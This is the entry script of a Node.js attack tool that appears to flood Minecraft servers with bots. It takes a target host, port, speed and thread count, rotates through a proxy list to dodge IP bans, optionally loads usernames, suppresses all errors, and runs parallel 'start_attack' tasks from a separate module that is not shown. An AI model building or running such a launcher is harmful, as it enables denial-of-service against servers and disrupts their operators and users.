const fs = require('fs');
const { log } = require("./cmd");
const { start_attack } = require('./attack');

let arguments = process.argv;

if (arguments.length == 0) {
    console.error("No arguments found");
    console.error("Usage: node src/index.js host <ip> port <port> username <true/false> version 1.8.8 speed 120 threads 4");
    return;
}

arguments = arguments.slice(2);

let args = {};

// Parse arguments
for (let i = 0; i < arguments.length; i += 2) {
    args[arguments[i]] = arguments[i + 1];
}

log("Loaded arguments");

// Load proxies
if (!fs.existsSync("proxies.txt")) {
    log("Can't find proxies.txt file");
    log("Create a file named proxies.txt with ip:port format");
    return;
}

const content = fs.readFileSync("proxies.txt", "utf-8");
const proxies = content.split(/\r?\n|\r|\n/g);

log(`Loaded ${proxies.length} proxies!`);

// Load usernames
let usernames = [];

if ("username" in args && args["username"]) {
    const content = fs.readFileSync("usernames.txt", "utf-8");
    usernames = content.split(/\r?\n|\r|\n/g);

    log(`Loaded ${usernames.length} usernames!`);
}

process.on('uncaughtException', function (err) { });

(async () => {
    const threads = "threads" in args ? parseInt(args["threads"]) : 1;
    const tasks = [];

    for (let i = 0; i < threads; i++) {
        tasks.push(start_attack(args, proxies, usernames));
    }

    await Promise.all(tasks);
})();